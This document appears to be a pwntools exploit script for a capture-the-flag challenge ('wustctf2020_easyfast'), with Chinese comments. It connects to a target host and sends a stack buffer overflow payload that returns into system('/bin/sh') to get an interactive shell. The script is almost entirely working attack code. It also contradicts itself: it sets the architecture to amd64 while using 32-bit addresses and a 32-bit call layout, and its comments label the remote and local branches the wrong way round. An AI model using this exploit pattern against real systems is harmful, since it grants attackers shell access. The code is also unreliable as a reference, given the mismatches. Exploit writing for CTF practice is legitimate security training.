from pwn import *

set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './wustctf2020_easyfast'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改


# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)
# if_remote = 0  # 0为远程
if if_remote == 1:
    io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    # io = remote("node4.buuoj.cn", 27781)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x8c  # ida看，buf和r差多少
call_sys = 0x8048320 # ida找到system函数，进去之后通过; CODE XREF: _system↑j进system的plt，直接左边地址，不要jmp：.plt:08048320 FF 25 10 A0 04 08             jmp     ds:off_804A010
bin_sh_addr = 0x804A024  # ida用shift+f12找到sh

payload = flat(['a' * padding, call_sys, bin_sh_addr])
delimiter = 'Input:'

if if_remote == 0:
    io.sendline(payload)  # 远程用
    
else:
    io.sendlineafter(delimiter, payload)  # 本地用

io.interactive()